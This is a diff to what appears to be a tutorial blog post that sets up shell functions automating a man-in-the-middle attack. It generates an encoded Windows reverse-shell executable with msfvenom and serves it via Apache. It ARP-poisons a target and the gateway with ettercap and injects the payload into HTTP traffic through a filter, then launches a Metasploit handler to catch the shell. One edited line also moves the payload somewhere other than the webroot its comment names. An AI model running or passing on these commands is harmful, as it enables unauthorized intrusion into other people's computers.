@@ -127,7 +127,7 @@ Copy and paste the following
 use exploit/multi/handler
 set payload windows/shell/reverse_tcp
 set LHOST MYIP
-set LPORT 3333
+set LPORT MYPORT
 exploit
 {% endhighlight %}
 
@@ -135,12 +135,34 @@ Save with Ctrl+O and exit with Ctrl+X.
 
 <b>Making life easier with the .bashrc file</b>
 
-Now open the .bashrc file and add the following two functions
+Now open the .bashrc file and add the following varibles
 
 {% highlight ruby %}
+#Metaspoit Paths
+
+export msf_path=/var/www/html;
+export msf_rc_path="$HOME/msfscripts";
+
+#Metasploit Files
+
+msf_rc_http="payload_http.rc";
+
+#Metasploit Varibles
+
+function msf_platform () { echo "windows"; }
+lport="3333";
+{% endhighlight %}
+
+Now add the following two functions
+
+{% highlight ruby %}
+#HTTP Payload Injection /w BEEF/Metasploit
+
 function inject_http ()
 {
-msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=$myIP LPORT=3333 -b "\x00" -e x86/shikata_ga_nai -f exe -o ~/payload.exe;
+sudo sysctl -w net.ipv4.ip_forward=1;
+msfvenom -a x86 --platform $msf_platform -p $msfpayload LHOST=$myIP LPORT=$lport -b "\x00" -e x86/shikata_ga_nai -f exe -o $HOME/http_payload.exe;
+
 #msfvenom: Generates executables that provide backdoor access
 #-a: Hardware architecture. Almost always x86
 #--platform: Operating system to develop for
@@ -151,31 +173,40 @@ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=$myIP LPOR
 #-e: encoding: Almost always x86/shikata_ga_nai for exes
 #-f: Executible format. Always EXE for Windows.
 #-o: File output
-sudo mv ~/payload.exe /var/www/html/;
+
+sudo mv $HOME/http_payload.exe $msf_rc_http;
+
 #Copy the payload to the webroot
 
 sudo cp /etc/ettercap/etter.beef.conf /etc/ettercap/etter.conf;
-#replace the active etter.conf file
-sed -i 's/MYIP/'$myIP'/g' ~/filters/http;
+#Replace the active etter.conf file
+sed -i 's/MYIP/'$myIP'/g' $ettercap_filters/http;
 #Place your current local IP into the ettercap filter
-sudo etterfilter ~/filters/http;
+sudo etterfilter $ettercap_filters/http;
 #Convert ettercap filter script to an ettercap readable format
 
 sudo systemctl start apache2;
 #Start apache
-sudo ettercap -T -F ~/filters/filter.ef -M arp:remote /$targetIP// /$gateway$//;
+sudo ettercap -T -F $HOME/filter.ef -M arp:remote /$targetIP// /$gatewayIP//;
 #Then poison with -F (filter)
 sudo systemctl stop apache2;
+sudo sysctl -w net.ipv4.ip_forward=0;
 #Cleanup
 }
+{% endhighlight %}
+
+{% highlight ruby %}
+#Set up HTTP inject metasploit script rc
 
 function exploit_http ()
 {
-sed -i 's/MYIP/'$myIP'/g' ~/msfscripts/payload_http.rc;
+sed -i 's/MYIP/'$myIP'/g' $msf_rc_path/$msf_rc_http;
+sed -i 's/MYPORT/'$lport'/g' $msf_rc_path/$msf_rc_http;
 #Place your current local IP into the rc script
-msfconsole -r ~/msfscripts/payload_http.rc;
+sudo msfconsole -r $msf_rc_path/$msf_rc_http;
 #Launch metasploit with the automated script
 }
+
 {% endhighlight %}
 
 Save .bashrc with Ctrl+O and exit with Ctrl+X. Close terminal for the changes to take effect. At this point, the setup is complete. 
